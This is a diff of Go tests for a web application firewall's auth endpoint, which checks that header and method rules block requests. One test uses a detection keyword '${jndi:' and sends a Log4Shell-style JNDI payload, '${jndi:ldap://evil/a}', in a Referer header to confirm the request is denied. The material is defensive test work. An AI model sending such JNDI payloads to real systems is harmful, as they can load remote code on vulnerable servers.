@@ -40,8 +40,13 @@ domains:
 
 func testServer(t *testing.T) *httptest.Server {
 	t.Helper()
+	return testServerWithYAML(t, testYAML)
+}
+
+func testServerWithYAML(t *testing.T, yaml string) *httptest.Server {
+	t.Helper()
 	path := filepath.Join(t.TempDir(), "guardian.yaml")
-	if err := os.WriteFile(path, []byte(testYAML), 0o600); err != nil {
+	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
 		t.Fatal(err)
 	}
 	cfg, err := core.LoadConfig(path)
@@ -121,6 +126,51 @@ func TestAuthEndpoint(t *testing.T) {
 	resp = do(t, "GET", ts.URL+"/auth", guardianHeaders("plain.test", "203.0.113.9", "/robots.txt", "curl"), nil)
 	if resp.StatusCode != http.StatusOK {
 		t.Fatalf("allowlisted path: status = %d, want 200", resp.StatusCode)
+	}
+}
+
+// TestAuthHeaderAndMethodRules proves the auth endpoint feeds the WAF what
+// header/method rules need: a header:referer rule fires on the Referer the
+// auth subrequest inherits from the client, and a methods-only rule fires on
+// the method relayed via X-Guardian-Method.
+func TestAuthHeaderAndMethodRules(t *testing.T) {
+	rules := filepath.Join(t.TempDir(), "rules.yaml")
+	if err := os.WriteFile(rules, []byte(`rules:
+  - id: jndi-header
+    targets: [ "header:referer" ]
+    keywords: [ "${jndi:" ]
+  - id: no-track
+    methods: [ TRACK ]
+`), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	ts := testServerWithYAML(t, fmt.Sprintf(`store: { backend: memory }
+defaults:
+  waf: { keywords: { enabled: true, rules_file: "%s" } }
+`, rules))
+
+	// Clean request: allowed.
+	resp := do(t, "GET", ts.URL+"/auth", guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0"), nil)
+	if resp.StatusCode != http.StatusOK {
+		t.Fatalf("clean: status = %d, want 200", resp.StatusCode)
+	}
+
+	// Same request with a JNDI payload in the Referer: denied by the header rule.
+	h := guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0")
+	h["Referer"] = "https://example.com/?x=${jndi:ldap://evil/a}"
+	resp = do(t, "GET", ts.URL+"/auth", h, nil)
+	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:jndi-header" {
+		t.Fatalf("jndi referer: status = %d reason = %q, want 403 waf:jndi-header",
+			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
+	}
+
+	// A TRACK request (relayed method, the subrequest itself is GET): denied.
+	h = guardianHeaders("plain.test", "198.51.100.7", "/page", "Mozilla/5.0")
+	h["X-Guardian-Method"] = "TRACK"
+	resp = do(t, "GET", ts.URL+"/auth", h, nil)
+	if resp.StatusCode != http.StatusForbidden || resp.Header.Get("X-Guardian-Reason") != "waf:no-track" {
+		t.Fatalf("TRACK: status = %d reason = %q, want 403 waf:no-track",
+			resp.StatusCode, resp.Header.Get("X-Guardian-Reason"))
 	}
 }
 
